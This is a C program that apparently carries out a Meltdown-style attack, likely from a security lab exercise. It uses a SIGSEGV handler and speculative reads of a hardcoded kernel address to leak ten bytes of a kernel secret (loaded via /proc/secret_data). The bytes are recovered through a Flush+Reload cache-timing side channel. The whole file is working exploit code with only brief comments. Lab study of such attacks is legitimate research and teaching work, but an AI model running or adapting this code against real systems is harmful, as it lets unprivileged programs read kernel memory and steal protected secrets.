#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <emmintrin.h>
#include <x86intrin.h>

#define CACHE_HIT_TIME (250)
#define OFFSET 2048

static sigjmp_buf jbuf;

static void stop_handle()
{
   siglongjmp(jbuf, 1);
}

int main(){

    signal(SIGSEGV, stop_handle);
    // SIGSEGV is set when an invaild memory access is detected
    // change the exception handler so it won't terminate the process

    unsigned char array[256 * 4096];

    char message[11];
    message[10] = '\0';
    int fp;
    int sig;
    char data;
    int temp = 0;
    unsigned char *addr;
    unsigned long int basetime;
    unsigned long int mtime;
    int max;
    int bytec;


    int counter[256];

    for(bytec = 0; bytec < 10; bytec ++){ // 10 bytes in total need to be read

        if((fp = open("/proc/secret_data", O_RDONLY)) < 0)
            return -1;
        
        memset(counter, 0, sizeof(counter));

        // clear cache
        for(int i = 0; i < 256; i ++) array[i * 4096 + OFFSET] = 1;
        for(int i = 0; i < 256; i ++) _mm_clflush(&array[i * 4096 + OFFSET]);

        for(int i = 0; i < 500; i ++){ // for every byte, try 500 times to increase possibility of success
            if((sig = pread(fp, NULL, 0, 0)) < 0) // put secret data in cache
                return -1;
            
            // clear cache
            for(int j = 0; j < 256; j ++) _mm_clflush(&array[j * 4096 + OFFSET]);

            if(sigsetjmp(jbuf, 1) == 0){
                asm volatile(
                    ".rept 400;"            
                    "add $0x141, %%eax;"
                    ".endr;"                    
                
                    :
                    :
                    : "eax"
                ); //magic

                data = *(char *)(0xffffffffc0d72000 + bytec); // exception!
                array[data * 4096 + OFFSET] = 1;
            }

            for(int i = 0;i < 256;++ i){
                addr = &array[i * 4096 + OFFSET];
                basetime = __rdtscp(&temp);
                temp = *addr;
                mtime = __rdtscp(&temp) - basetime;
                if(mtime < CACHE_HIT_TIME)
                    counter[i] ++;
            }

        }

        max = 0;
        for(int i = 1; i < 256; i ++){
            if(counter[i] > counter[max])
                max = i;
        }

        message[bytec] = max;

    }

    printf("%s\n", message);

    return 0;

}